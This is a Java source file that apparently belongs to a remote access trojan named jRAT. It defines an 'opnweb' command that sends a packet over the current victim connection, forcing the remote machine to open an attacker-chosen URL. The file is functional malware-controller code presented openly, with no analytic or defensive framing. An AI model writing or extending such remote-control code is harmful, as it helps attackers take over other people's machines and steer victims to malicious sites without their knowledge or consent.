package net.jrat.core.command.commands.connection;

import org.apache.commons.cli.CommandLine;

import net.jrat.core.command.Command;
import net.jrat.core.packet.server.S4PacketOpenWebsite;

public class OpenWeb extends Command
{
	public OpenWeb()
	{
		super("opnweb", new String[] { "url" }, new String[] { "sets the url" }, "let the connection open a website");
	}

	@Override
	public void execute(CommandLine commandLine) throws Exception
	{
		if(this.server.currentConnection == null)
			throw new Exception("current connection is equal to null");
		
		final String url = commandLine.getOptionValue("url", null);
		
		if(url == null)
			throw new Exception("url is needed");
		
		this.server.currentConnection.outputStream.writeObject(new S4PacketOpenWebsite(url));
	}
}